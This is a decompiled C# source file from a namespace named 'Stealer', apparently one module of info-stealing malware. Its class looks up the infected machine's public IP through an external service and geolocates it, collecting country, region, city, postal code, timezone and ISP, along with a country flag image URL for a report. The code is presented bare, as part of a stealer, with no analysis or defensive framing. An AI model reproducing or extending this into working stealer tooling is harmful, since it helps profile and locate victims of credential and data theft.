using System;
using System.Net.Http;
using System.Threading.Tasks;

namespace Stealer
{
	// Token: 0x02000003 RID: 3
	internal class IP
	{
		// Token: 0x06000012 RID: 18 RVA: 0x00002818 File Offset: 0x00000A18
		public IP()
		{
			this.ip = this.GetIP();
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002890 File Offset: 0x00000A90
		private string GetIP()
		{
			string result;
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					Task<HttpResponseMessage> async = httpClient.GetAsync("https://ip4.seeip.org");
					Task<string> task = async.Result.Content.ReadAsStringAsync();
					result = task.Result;
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
				result = string.Empty;
			}
			return result;
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002914 File Offset: 0x00000B14
		public void GetIPGeo()
		{
			try
			{
				using (HttpClient httpClient = new HttpClient())
				{
					Task<HttpResponseMessage> async = httpClient.GetAsync("http://ip-api.com//json/" + this.ip);
					Task<string> task = async.Result.Content.ReadAsStringAsync();
					string result = task.Result;
					this.country = Common.Extract("country", result);
					this.countryCode = Common.Extract("countryCode", result);
					this.regionName = Common.Extract("regionName", result);
					this.city = Common.Extract("city", result);
					this.zip = Common.Extract("zip", result);
					this.timezone = Common.Extract("timezone", result);
					this.isp = Common.Extract("isp", result);
					Console.WriteLine(result);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00002A18 File Offset: 0x00000C18
		public string GetCountryIcon()
		{
			return "https://www.countryflags.io/" + this.countryCode + "/flat/48.png";
		}

		// Token: 0x04000007 RID: 7
		public string ip = string.Empty;

		// Token: 0x04000008 RID: 8
		public string country = string.Empty;

		// Token: 0x04000009 RID: 9
		public string countryCode = string.Empty;

		// Token: 0x0400000A RID: 10
		public string regionName = string.Empty;

		// Token: 0x0400000B RID: 11
		public string city = string.Empty;

		// Token: 0x0400000C RID: 12
		public string zip = string.Empty;

		// Token: 0x0400000D RID: 13
		public string timezone = string.Empty;

		// Token: 0x0400000E RID: 14
		public string isp = string.Empty;
	}
}
